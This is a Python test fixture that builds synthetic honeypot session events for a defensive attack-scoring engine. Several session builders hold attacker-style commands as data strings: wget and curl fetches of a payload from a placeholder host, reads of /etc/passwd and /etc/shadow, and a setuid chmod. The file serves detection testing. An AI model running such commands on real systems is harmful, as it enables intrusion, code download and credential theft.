"""
tests/fixtures/synthetic_sessions.py

Synthetic normalized-event fixtures for analysis engine tests.

All IP addresses are RFC 5737 documentation addresses (192.0.2.x).
All timestamps are clearly fictional (2026-01-15).
No real captured attacker data is used.

These helpers return plain Python lists of event dicts matching the
normalized schema produced by parser.cowrie_parser.
"""

from __future__ import annotations


_BASE_TS = "2026-01-15T10:00:00+00:00"
_SRC_IP = "192.0.2.1"
_DST_IP = "192.0.2.10"
_PORT = 2222
_SID = "synth-session-001"


def _ev(offset_min: int, event_type: str, **extra) -> dict:
    """Return a minimal normalized event dict."""
    h, m = divmod(offset_min, 60)
    ts = f"2026-01-15T{10 + h:02d}:{m:02d}:00+00:00"
    base = {
        "timestamp": ts,
        "session_id": _SID,
        "event_type": event_type,
        "source_ip": _SRC_IP,
        "destination_ip": _DST_IP,
        "destination_port": _PORT,
    }
    base.update(extra)
    return base


# ---------------------------------------------------------------------------
# Session builders
# ---------------------------------------------------------------------------

def empty_session() -> list[dict]:
    """Session with no events at all."""
    return []


def connect_only() -> list[dict]:
    """Session with only a connect event — no commands, no logins."""
    return [_ev(0, "session_connect")]


def single_ls() -> list[dict]:
    """Session with one 'ls' command — ambiguous, low score."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="ls"),
    ]


def recon_session() -> list[dict]:
    """Session with several classic recon commands."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="whoami"),
        _ev(3, "command", command="uname -a"),
        _ev(4, "command", command="hostname"),
        _ev(5, "command", command="id"),
        _ev(6, "command", command="ifconfig"),
        _ev(7, "session_closed"),
    ]


def brute_force_session(num_failures: int = 7) -> list[dict]:
    """Session with repeated login failures (no success)."""
    events = [_ev(0, "session_connect")]
    for i in range(num_failures):
        events.append(_ev(i + 1, "login", username="admin", success=False))
    events.append(_ev(num_failures + 1, "session_closed"))
    return events


def brute_force_then_success() -> list[dict]:
    """Session with failures followed by a successful login."""
    events = [_ev(0, "session_connect")]
    for i in range(5):
        events.append(_ev(i + 1, "login", username="root", success=False))
    events.append(_ev(6, "login", username="root", success=True))
    events.append(_ev(7, "command", command="whoami"))
    events.append(_ev(8, "session_closed"))
    return events


def download_session() -> list[dict]:
    """Session with a wget download command."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="whoami"),
        _ev(3, "command", command="wget http://192.0.2.99/payload.sh"),
        _ev(4, "session_closed"),
    ]


def privilege_escalation_session() -> list[dict]:
    """Session with sudo and a setuid chmod."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="www-data", success=True),
        _ev(2, "command", command="whoami"),
        _ev(3, "command", command="sudo -l"),
        _ev(4, "command", command="chmod +s /tmp/sh"),
        _ev(5, "session_closed"),
    ]


def credential_access_session() -> list[dict]:
    """Session that reads /etc/passwd and /etc/shadow."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="cat /etc/passwd"),
        _ev(3, "command", command="cat /etc/shadow"),
        _ev(4, "command", command="ls -la /root/.ssh"),
        _ev(5, "session_closed"),
    ]


def multi_behaviour_session() -> list[dict]:
    """Session that exhibits recon + file discovery + download."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=False),
        _ev(2, "login", username="root", success=True),
        _ev(3, "command", command="whoami"),
        _ev(4, "command", command="uname -a"),
        _ev(5, "command", command="ls -la /"),
        _ev(6, "command", command="find / -name '*.conf'"),
        _ev(7, "command", command="curl http://192.0.2.99/tool"),
        _ev(8, "session_closed"),
    ]


def file_discovery_session() -> list[dict]:
    """Session focused on filesystem discovery."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="ls"),
        _ev(3, "command", command="ls -la"),
        _ev(4, "command", command="find / -type f -name '*.sh'"),
        _ev(5, "command", command="stat /etc/cron.d"),
        _ev(6, "session_closed"),
    ]


def unknown_commands_session() -> list[dict]:
    """Session with only unrecognized commands — should score low."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="myunknowntool --help"),
        _ev(3, "command", command="anotherweirdcmd"),
        _ev(4, "session_closed"),
    ]


def ambiguous_ls_session() -> list[dict]:
    """One 'ls' only — possible FP (FD-01 WEAK), should NOT score high."""
    return [
        _ev(0, "session_connect"),
        _ev(1, "login", username="root", success=True),
        _ev(2, "command", command="ls"),
    ]


def missing_fields_events() -> list[dict]:
    """Events with some missing optional fields — should not crash."""
    return [
        {"timestamp": "2026-01-15T10:00:00+00:00", "event_type": "session_connect"},
        {"timestamp": "2026-01-15T10:01:00+00:00", "event_type": "command"},
        # command field absent
        {"timestamp": "2026-01-15T10:02:00+00:00", "event_type": "login"},
        # username and success fields absent
    ]


def two_session_events() -> list[dict]:
    """Events from two distinct sessions for engine.analyse_all_sessions."""
    return [
        {**_ev(0, "session_connect"), "session_id": "sess-alpha"},
        {**_ev(1, "command", command="whoami"), "session_id": "sess-alpha"},
        {**_ev(0, "session_connect"), "session_id": "sess-beta"},
        {**_ev(1, "login", username="admin", success=False), "session_id": "sess-beta"},
        {**_ev(2, "login", username="admin", success=False), "session_id": "sess-beta"},
        {**_ev(3, "login", username="admin", success=False), "session_id": "sess-beta"},
        {**_ev(4, "login", username="admin", success=False), "session_id": "sess-beta"},
        {**_ev(5, "login", username="admin", success=False), "session_id": "sess-beta"},
    ]
